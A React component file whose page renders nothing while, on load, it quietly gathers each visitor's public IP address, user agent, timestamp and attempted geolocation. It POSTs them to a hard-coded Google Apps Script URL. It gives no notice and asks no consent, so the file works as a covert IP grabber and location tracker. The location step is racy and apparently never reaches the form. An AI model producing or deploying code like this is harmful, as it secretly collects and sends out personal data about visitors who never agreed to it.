import { useEffect } from 'react'
export default function App() {
  async function getIPAddress() {
    const response = await fetch('https://api64.ipify.org?format=json');
    const data = await response.json();
    const formData = new FormData();

    
    let latitude;
    let longitude;

    const currentDate = new Date();
    console.log("Current Date:", currentDate);

    navigator.geolocation.getCurrentPosition(function (position) {
      latitude = position.coords.latitude;
      longitude = position.coords.longitude;
      console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
      formData.append("Location", `Latitude: ${latitude}, Longitude: ${longitude}`);

    });

    const userAgent = navigator.userAgent;
    console.log("User Agent:", userAgent);

    formData.append("Ip", data.ip);
    formData.append("Date", currentDate);
    // formData.append("Location", `Latitude: ${latitude}, Longitude: ${longitude}`);
    formData.append("Agent", userAgent);
    Submit(formData)
  }

useEffect(() => {
  getIPAddress()
}, [])

  function Submit(formData) {
    fetch(
      // "https://script.google.com/macros/s/AKfycbw3p5vg2AfUg3vBJmAQouPMLujglgUFqzEN-25tIb_95Uyrdg0IEDe1s0nk0Ks_nwdoNQ/exec",
      // "https://script.google.com/macros/s/AKfycbw3p5vg2AfUg3vBJmAQouPMLujglgUFqzEN-25tIb_95Uyrdg0IEDe1s0nk0Ks_nwdoNQ/exec",
      "https://script.google.com/macros/s/AKfycbxxu4njWr1s_F9GJ26qYH7HWiMG48tshXnoeyMZgw2s81sMmZxDVLsa8vCWkeT8-WgqfQ/exec",
      {
        method: "POST",
        body: formData
      }
    )
      .then((res) => res.json())
      .then((data) => {
        console.log(data);
      })
      .catch((error) => {
        console.log(error);
      });
  }
  return (
    <div className="App" />
  );
}